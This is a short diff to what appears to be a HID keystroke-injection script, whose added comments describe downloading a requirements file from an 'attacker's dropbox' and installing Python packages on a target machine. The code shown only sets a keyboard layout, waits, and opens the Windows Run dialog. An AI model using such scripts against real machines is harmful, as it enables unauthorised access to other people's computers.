@@ -1,3 +1,8 @@
+// Aashish Aryal
+// A HID script download requirements.txt from attacke's dropbox
+// and install necessary Python packages
+// This script is to be run from attacker's machine on target machine
+
 layout("US")
 delay(500)
 press("GUI r") // Open Run dialog
